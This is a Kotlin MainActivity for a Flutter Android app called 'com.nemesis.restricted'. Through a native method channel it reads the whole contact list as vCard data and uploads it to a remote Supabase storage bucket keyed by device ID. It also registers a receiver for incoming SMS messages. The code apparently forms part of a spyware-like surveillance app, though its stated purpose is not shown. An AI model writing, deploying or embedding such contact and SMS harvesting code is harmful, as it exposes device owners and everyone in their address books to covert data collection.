package com.nemesis.restricted

import io.flutter.embedding.android.FlutterActivity
import android.content.IntentFilter
import android.content.SharedPreferences
import android.util.Log
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity: FlutterActivity() {
    private val CHANNEL = "com.nemesis.restricted/native"
    private val client = SupabaseClientManager.supabase

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "getContacts" -> {
                    val deviceId = call.argument<Number>("deviceId")?.toLong() ?: -1L
                    getContacts(deviceId)
                    result.success(null)
                }
                "storeDeviceId" -> {
                    val deviceId = call.argument<Number>("deviceId")?.toLong() ?: -1L
                    storeDeviceId(deviceId)
                    result.success(null)
                }
                "registerSmsReceiver" -> {
                    registerSmsReceiver()
                    result.success("Receiver registered")
                }
                else -> result.notImplemented()
            }
        }
    }

    private fun storeDeviceId(deviceId: Long) {
        if(deviceId != -1L) {
            val sharedPreferences: SharedPreferences = context.getSharedPreferences("pref1", MODE_PRIVATE)
            sharedPreferences.edit().apply {
                putLong("device_id", deviceId)
                apply()
            }
        } else {
            Log.e("device id", "weird error, device id is null")
        }
    }

    private fun getContacts(deviceId:Long?) {
        val contentResolver = contentResolver
        if (deviceId != null) {
            val vCardData = fetchContacts(contentResolver, deviceId)
            uploadVCardToStorage(client, "contacts_bucket", "$deviceId.vcf", vCardData, deviceId)
        } else {
            Log.e("Weird error", "Device ID is null")
        }
    }

    private fun registerSmsReceiver() {
        val smsReceiver = SmsReceiver()
        val filter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
        registerReceiver(smsReceiver, filter)
    }


}
